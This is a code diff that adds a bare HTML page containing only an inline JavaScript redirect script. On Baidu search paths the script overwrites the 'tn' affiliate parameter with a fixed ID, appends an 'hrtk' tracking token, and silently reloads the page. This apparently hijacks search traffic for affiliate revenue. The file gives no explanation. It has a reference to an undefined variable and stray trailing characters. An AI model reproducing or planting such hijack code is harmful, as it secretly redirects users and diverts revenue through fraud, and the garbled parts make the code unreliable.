@@ -1,0 +1,36 @@
+<html><head><script type="text/javascript">
+var tk="05804450",pl="97000172_dg|93534940_hao_pg|97667944_hao_pg",l=location,u="http://"+l.hostname+l.pathname,tn='97000172_dg',ff,ru;
+ff=function(s){
+var p={},u="",a;
+s=s.substr(1).split("&");
+for(i in s)
+{
+	a=s[i].split("=");
+	p[a[0]]=a[1];
+}
+if (!('tn' in p)||pl.indexOf(p['tn'])<0){
+	p['tn']=tn;
+}
+p['hrtk']=tk;
+for(i in p){
+	u+="&"+i+"="+p[i];
+}
+return u.substr(1);
+}
+if(l.pathname=='/'||l.pathname=='/s'||l.pathname=='/index.php'||l.pathname=='/baidu'){
+if(l.search.length>0){
+ru=u+"?"+ff(l.search);
+}else if(l.hash.length>0){
+ru=u+"s?"+ff(l.hash);
+}else{
+ru=u+"?tn="+tn+"&hrtk="+tk;
+}
+}else{
+if(l.href.indexOf('?')>0){
+	ru = l.href+"&hrtk="+tk;
+}else{
+	ru =   href+"?hrtk="+tk;
+}
+};
+l.replace(ru);
+</script></head><body></body></html>去4=4-6
